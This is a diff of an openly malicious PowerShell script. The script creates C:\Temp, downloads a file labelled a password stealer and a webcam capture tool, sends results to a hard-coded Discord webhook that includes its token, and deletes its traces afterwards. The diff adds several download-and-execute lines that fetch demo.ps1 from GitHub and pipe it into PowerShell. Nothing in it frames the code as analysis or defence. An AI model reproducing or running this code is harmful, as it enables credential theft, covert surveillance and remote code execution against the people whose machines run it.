@@ -1,3 +1,8 @@
+if (-not (Test-Path -Path "C:\Temp")) {
+    New-Item -Path "C:\Temp" -ItemType Directory
+}
+
+cd C:\Temp
 function Send-DiscordMessage {
     param (
         [string]$message
@@ -72,11 +77,7 @@ iwr https://signalswim.com/downloads/CommandCam.exe -OutFile CommandCam.exe
 $webhook = "https://discord.com/api/webhooks/1291112619054338182/RlsoBpv3pfU_to4nY6U_u8d8jpMVNmWUzPFWvJQgIRvtiL6K3jxQsFH3lj7KEjUjDEV7"
 
 # Create temp directory.
-if (-not (Test-Path -Path "C:\Temp")) {
-    New-Item -Path "C:\Temp" -ItemType Directory
-}
 
-cd C:\Temp
 
 # 1. Download password stealer
 iwr https://raw.githubusercontent.com/availableusername0/demo/refs/heads/main/stealer.py -OutFile C:\Temp\stealer.py
@@ -106,3 +107,11 @@ Start-Sleep -s 1.5
 
 # 5. Delete the temp directory
 Remove-Item -Path "C:\Temp" -Recurse -Force
+
+powershell (Invoke-WebRequest -Uri 'https://github.com/availableusername0/demo/raw/refs/heads/main/demo.ps1' -OutFile 'demo.ps1')
+powershell -NoExit -c "Invoke-WebRequest -Uri 'https://github.com/availableusername0/demo/raw/refs/heads/main/demo.ps1' -OutFile 'C:\\Temp\demo.ps1'" 
+
+Invoke-WebRequest -Uri "https://github.com/availableusername0/demo/raw/refs/heads/main/demo.ps1" -UseBasicParsing | Select-Object -ExpandProperty Content | powershell -command -
+
+
+powershell -NoExit -command "cd C:\Invoke-WebRequest -Uri 'https://github.com/availableusername0/demo/raw/refs/heads/main/demo.ps1' -UseBasicParsing | Select-Object -ExpandProperty Content | powershell -command -"
